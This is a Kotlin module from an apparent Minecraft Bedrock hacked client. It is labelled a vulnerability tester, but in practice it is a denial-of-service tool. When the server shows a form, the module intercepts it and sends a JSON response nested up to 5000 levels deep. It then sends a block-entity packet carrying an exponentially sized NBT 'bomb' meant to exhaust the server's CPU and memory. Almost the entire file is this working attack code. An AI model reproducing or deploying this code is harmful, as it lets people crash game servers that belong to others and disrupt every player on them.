package com.mucheng.mucute.client.game.module.misc

import com.mucheng.mucute.client.game.GameSession
import com.mucheng.mucute.client.game.InterceptablePacket
import com.mucheng.mucute.client.game.Module
import com.mucheng.mucute.client.game.ModuleCategory
import org.cloudburstmc.math.vector.Vector3i
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.cloudburstmc.nbt.NbtMap
import org.cloudburstmc.protocol.bedrock.packet.BlockEntityDataPacket
import org.cloudburstmc.protocol.bedrock.packet.ModalFormRequestPacket
import org.cloudburstmc.protocol.bedrock.packet.ModalFormResponsePacket

/**
 * Модуль для продвинутого тестирования уязвимостей сервера с использованием
 * алгоритмических атак ("бомб"), вызывающих высокую нагрузку на CPU/RAM.
 */
class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Misc) {

    // --- Настройки ---
    private val testWithDeepJson by boolValue("Test Deep JSON Bomb", true)
    private val testWithNbtBomb by boolValue("Test NBT Bomb", true)
    
    private val attackDelay by intValue("Attack Delay (ms)", 200, 50..2000)
    
    private val jsonNestingDepth by intValue("JSON Nesting Depth", 800, 100..5000)

    private val nbtBombDepth by intValue("NBT Bomb Depth", 12, 5..20)
    private val nbtBombWidth by intValue("NBT Bomb Width", 10, 5..20)

    override fun onEnabled() {
        super.onEnabled()
        if (isSessionCreated) session.displayClientMessage("§a[AnomalousTester] Модуль включен. Ожидание формы-триггера.")
    }

    override fun onDisabled() {
        super.onDisabled()
        if (isSessionCreated) session.displayClientMessage("§c[AnomalousTester] Модуль выключен.")
    }

    override fun beforePacketBound(interceptablePacket: InterceptablePacket) {
        if (!isEnabled) return

        val packet = interceptablePacket.packet
        if (packet is ModalFormRequestPacket) {
            interceptablePacket.intercept()
            
            session.displayClientMessage("§6[AnomalousTester] Форма перехвачена! Запускаю аномальную атаку...")

            GlobalScope.launch {
                // <<< ИЗМЕНЕНО: Убрано .value
                if (testWithDeepJson) {
                    sendDeeplyNestedFormResponse(packet.formId)
                    // <<< ИЗМЕНЕНО: Убрано .value
                    delay(attackDelay.toLong())
                }
                // <<< ИЗМЕНЕНО: Убрано .value
                if (testWithNbtBomb) {
                    sendNbtBombPacket()
                }
                session.displayClientMessage("§a[AnomalousTester] Атака завершена. Проверяйте состояние сервера.")
            }
        }
    }

    private fun sendDeeplyNestedFormResponse(formId: Int) {
        try {
            val responsePacket = ModalFormResponsePacket()
            responsePacket.setFormId(formId)

            var maliciousJson = "\"leaf\""
            // <<< ИЗМЕНЕНО: Убрано .value
            for (i in 1..jsonNestingDepth) {
                maliciousJson = "{\"key\":$maliciousJson}"
            }
            responsePacket.setFormData(maliciousJson)
            
            // <<< ИЗМЕНЕНО: send заменен на sendPacket
            (session as? GameSession)?.sendPacket(responsePacket)
            session.displayClientMessage("§e[AnomalousTester] Отправлена JSON-бомба (глубина: $jsonNestingDepth).")
        } catch (e: Exception) {
            session.displayClientMessage("§c[AnomalousTester] Ошибка при отправке JSON-бомбы: ${e.message}")
        }
    }

    private fun sendNbtBombPacket() {
        try {
            val nbtPacket = BlockEntityDataPacket()
            nbtPacket.setBlockPosition(Vector3i.ZERO)

            val payload: Any = "payload_data"

            var currentLevel: Any = payload
            // <<< ИЗМЕНЕНО: Убрано .value
            for (d in 1..nbtBombDepth) {
                val nextLevel = mutableListOf<Any>()
                // <<< ИЗМЕНЕНО: Убрано .value
                for (w in 1..nbtBombWidth) {
                    nextLevel.add(currentLevel)
                }
                currentLevel = nextLevel
            }
            
            // <<< ИЗМЕНЕНО: NbtMap.of заменен на NbtMap.from(mapOf(...))
            val root = NbtMap.from(mapOf("bomb" to currentLevel))

            nbtPacket.setData(root)
            
            // <<< ИЗМЕНЕНО: send заменен на sendPacket
            (session as? GameSession)?.sendPacket(nbtPacket)
            // <<< ИЗМЕНЕНО: Убрано .value
            val totalElements = Math.pow(nbtBombWidth.toDouble(), nbtBombDepth.toDouble()).toLong()
            session.displayClientMessage("§e[AnomalousTester] Отправлена NBT-бомба (глубина: $nbtBombDepth, ширина: $nbtBombWidth, ~${totalElements} элементов).")
        } catch (e: Exception) {
            session.displayClientMessage("§c[AnomalousTester] Ошибка при отправке NBT-бомбы: ${e.message}")
        }
    }
}
